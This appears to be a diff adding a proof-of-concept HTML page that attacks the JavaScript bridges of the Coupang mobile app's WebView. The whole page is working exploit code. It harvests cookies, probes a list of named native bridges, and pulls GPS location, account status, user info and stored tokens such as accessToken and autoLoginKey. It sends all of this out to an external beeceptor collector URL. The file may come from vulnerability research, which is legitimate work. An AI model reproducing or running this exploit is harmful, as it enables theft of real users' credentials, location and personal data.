@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC: JS Bridge Recon + Data Exfil</title>
+<style>
+  body { font-family: monospace; background: #111; color: #0f0; margin: 0; padding: 10px; font-size: 12px; }
+  .box { background: #1a1a1a; border: 1px solid #0f0; padding: 8px; margin: 4px 0; border-radius: 4px; word-break: break-all; }
+  .label { color: #ff0; font-weight: bold; }
+  .ok { color: #0f0; } .warn { color: #f80; } .err { color: #f44; }
+</style>
+</head>
+<body>
+<div class="label">=== COUPANG WEBVIEW BRIDGE RECON PoC ===</div>
+<div class="box" id="status">Initializing...</div>
+
+<script>
+// ===== CONFIG =====
+var EXFIL_URL = "https://evilios.free.beeceptor.com/hanatour.com/exfil";
+
+var log = document.getElementById("status");
+var collected = {};
+
+function addLog(label, val, cls) {
+  var d = document.createElement("div");
+  d.className = "box " + (cls || "ok");
+  d.innerHTML = "<span class='label'>" + label + ":</span> " + String(val).substring(0, 300);
+  document.body.appendChild(d);
+}
+
+// ===== 1. COOKIES =====
+var cookies = document.cookie;
+collected.cookies = cookies;
+addLog("document.cookie", cookies || "(empty — try after visiting coupang.com page)", cookies ? "ok" : "warn");
+
+// ===== 2. ENUMERATE ALL KNOWN JS BRIDGES =====
+var bridges = [
+  "CoupangApp",
+  "CoupangAppTracking",
+  "CoupangAppRecommend",
+  "CoupangWebView",
+  "CoupangAppLogging",
+  "CoupangAppGeolocation",
+  "CoupangMember",
+  "CoupangAppUserInfo",
+  "CoupangSyncTitle",
+  "WebAppDirectPurchaseInterface",
+  "WebAppTriforceInterface",
+  "WebAppUtilInterface"
+];
+var found = [];
+bridges.forEach(function(name) {
+  if (window[name] !== undefined) {
+    found.push(name);
+    addLog("BRIDGE FOUND", name, "ok");
+  } else {
+    addLog("bridge absent", name, "err");
+  }
+});
+collected.bridges = found;
+
+// ===== 3. GEOLOCATION via CoupangAppGeolocation bridge =====
+if (window.CoupangAppGeolocation) {
+  window._geoSuccess = function(lat, lng, acc) {
+    var loc = "lat=" + lat + " lng=" + lng + " accuracy=" + acc;
+    collected.gps = loc;
+    addLog("GPS LOCATION", loc, "ok");
+    exfil();
+  };
+  window._geoError = function(err) {
+    collected.gps_err = err;
+    addLog("GPS error", err, "warn");
+    exfil();
+  };
+  window._geoStatus = function(status) {
+    collected.gps_perm = status;
+    addLog("GPS permission", status, "ok");
+  };
+  try {
+    CoupangAppGeolocation.getLocationPermissionStatus("_geoStatus");
+    CoupangAppGeolocation.getCurrentLocation("_geoSuccess", "_geoError");
+    addLog("GPS call sent", "waiting for CoupangAppGeolocation callback...", "warn");
+  } catch(e) {
+    addLog("GPS call failed", e.message, "err");
+  }
+} else {
+  addLog("CoupangAppGeolocation", "NOT present in this WebView", "err");
+}
+
+// ===== 4. ACCOUNT INFO via CoupangMember =====
+if (window.CoupangMember) {
+  window._accountCb = function(result) {
+    collected.accountStatus = result;
+    addLog("ACCOUNT STATUS", JSON.stringify(result), "ok");
+    exfil();
+  };
+  try {
+    CoupangMember.requireDeviceAccountStatus(JSON.stringify({callbackName: "_accountCb"}));
+    addLog("requireDeviceAccountStatus", "called — waiting for callback", "warn");
+  } catch(e) {
+    addLog("CoupangMember.requireDeviceAccountStatus failed", e.message, "err");
+  }
+} else {
+  addLog("CoupangMember", "NOT present in this WebView", "err");
+}
+
+// ===== 5. USER INFO via CoupangAppUserInfo =====
+if (window.CoupangAppUserInfo) {
+  window._userInfoCb = function(result) {
+    collected.userInfo = result;
+    addLog("USER INFO", JSON.stringify(result), "ok");
+    exfil();
+  };
+  try {
+    CoupangAppUserInfo.getUserInfo(JSON.stringify({callback: "_userInfoCb"}));
+    addLog("getUserInfo", "called — waiting for callback", "warn");
+  } catch(e) {
+    addLog("CoupangAppUserInfo.getUserInfo failed", e.message, "err");
+  }
+}
+
+// ===== 6. APP STORAGE read (WebViewDataSharedPref) =====
+if (window.CoupangApp) {
+  var keysToTry = [
+    "accessToken", "authToken", "sessionToken", "userToken",
+    "memberId", "userId", "deviceId", "csrfToken",
+    "loginStatus", "autoLoginKey", "easyLoginKey"
+  ];
+  window._storageCb = function(val) {
+    if (val && val != '""' && val != "null") {
+      collected["storage_" + window._currentKey] = val;
+      addLog("STORAGE KEY [" + window._currentKey + "]", val, "ok");
+      exfil();
+    }
+  };
+  keysToTry.forEach(function(k, i) {
+    setTimeout(function() {
+      window._currentKey = k;
+      try {
+        CoupangApp.queryNativeKeyStringValue(JSON.stringify({key: k, callbackName: "_storageCb"}));
+      } catch(e) {}
+    }, i * 100);
+  });
+}
+
+// ===== 7. EXFIL all collected data =====
+function exfil() {
+  collected.url = window.location.href;
+  collected.userAgent = navigator.userAgent;
+  collected.timestamp = new Date().toISOString();
+  var img = new Image();
+  img.src = EXFIL_URL + "?d=" + encodeURIComponent(JSON.stringify(collected));
+  // Also POST for large payloads
+  try {
+    fetch(EXFIL_URL, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify(collected),
+      mode: "no-cors"
+    });
+  } catch(e) {}
+}
+
+// Initial exfil with what we have immediately
+setTimeout(exfil, 500);
+// Final sweep
+setTimeout(exfil, 3000);
+addLog("STATUS", "Running — check beeceptor for exfil data", "warn");
+</script>
+</body>
+</html>
